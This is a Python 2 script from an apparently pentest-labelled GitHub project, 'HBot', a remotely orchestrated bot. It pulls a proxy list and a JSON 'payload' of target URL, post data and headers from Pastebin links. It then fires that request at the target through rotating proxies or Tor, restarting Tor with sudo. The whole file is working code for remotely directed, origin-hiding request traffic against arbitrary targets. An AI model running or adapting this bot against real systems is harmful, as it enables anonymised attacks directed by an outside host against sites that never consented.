##
# HBot - Orchestrated bot
#
# @package intrd/pentest-hbot
# @version 
# @tags pentest, bot, eggdrop, pyton, bash
# @link http://github.com/intrd/pentest-hbot
# @author intrd (Danilo Salles) - http://dann.com.br
# @copyright (CC-BY-SA-4.0) 2016, intrd
# @license Creative Commons Attribution-ShareAlike 4.0 - http://creativecommons.org/licenses/by-sa/4.0
# Dependencies: 
# - python >=2.7.0
## @docbloc 1.1

import requests
import sys
import json
from get_proxy import get_proxies
import os
import re
import fileinput

use_tor = False
remote_proxylist = True
disable_random = True
proxyfile = "proxylist.txt"
url = 'http://pastebin.com/raw/eWTznEe5' #json payldr url

def remove_fromtxtfile(what,txtfile):
	lines = filter(lambda x:x[0:-1]!=what, open(txtfile, "r"))
	open(txtfile, "w").write("".join(lines))

if remote_proxylist:
	data = "http://pastebin.com/raw/ig3CztYn"
	data = requests.get(data).content
	filter_proxylist = False
if use_tor:
	proxy = {'http': "socks5://127.0.0.1:9050"}
else:
	if remote_proxylist:
		data = data.split('\r\n')
		proxy = get_proxies(data,disable_random)
	else:
		f = open(proxyfile, 'r')
		proxies = f.read().split('\n')
		proxy = get_proxies(proxies,disable_random)
	px = proxy.values()[0]
	px = re.sub(r'.*://', '', px)

# print proxy
# sys.exit(0)

data = requests.get(url)
pyload = json.loads(data.content)

if pyload["enabled"]=="1":
	try:
		r = requests.session()
		r = requests.get(pyload["targ"], data=json.dumps(pyload["postdata"]), headers=pyload["header"], proxies=proxy, timeout=7)
		print("code: "+str(r.status_code))
		print(r.headers)
		print dict(r.cookies) 
		print(r.content)
		if "hit server" not in r.content:
			print "ERROR!!"
			if filter_proxylist: remove_fromtxtfile(px,proxyfile)
	except requests.exceptions.RequestException as e:
		print e
		print "proxy "+px+" failed!"
		if filter_proxylist: remove_fromtxtfile(px,proxyfile)
	if use_tor:
		o=os.popen('sudo service tor restart')
		o=o.read()
		# o=os.popen('./tor_restart.sh')
		# o=o.read()
		#print o

